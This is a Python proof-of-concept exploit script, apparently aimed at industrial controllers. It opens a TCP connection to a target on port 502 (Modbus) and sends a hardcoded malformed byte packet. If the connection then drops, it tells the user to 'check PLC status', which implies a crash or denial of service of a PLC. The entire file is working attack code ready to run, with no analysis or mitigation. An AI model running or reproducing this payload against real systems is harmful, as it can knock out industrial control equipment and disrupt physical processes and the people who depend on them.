#!/usr/bin/env python3

__author__ = "Yanis Wang"
__email__ = "mryaniswang@gmail.com"

import argparse
import socket


def exploit(host: str, port: int):
    print("[*] Connecting to target")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print("[+] Connection established")
    print("[*] Sending private message")

    data = b"\xff\xff\x00\x00\x00\x14\x01\x5a\x00\x6d\x00\x80\x00\x00\xff\x00\x00\x00\xff\x00\x00\x00\xff\x00\x00\x00"
    sock.send(data)

    try:
        sock.recv(1024)
    except (ConnectionError, TimeoutError):
        print("[+] Connection closed, please check PLC status")
    else:
        print("[-] Target not vulnerable")
        exit(-1)

    print("[+] Done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, type=str, default=None, help="Target address")
    parser.add_argument("--port", required=False, type=int, default=502, help="Target port")
    args = parser.parse_args()

    exploit(args.host, args.port)


if __name__ == "__main__":
    main()
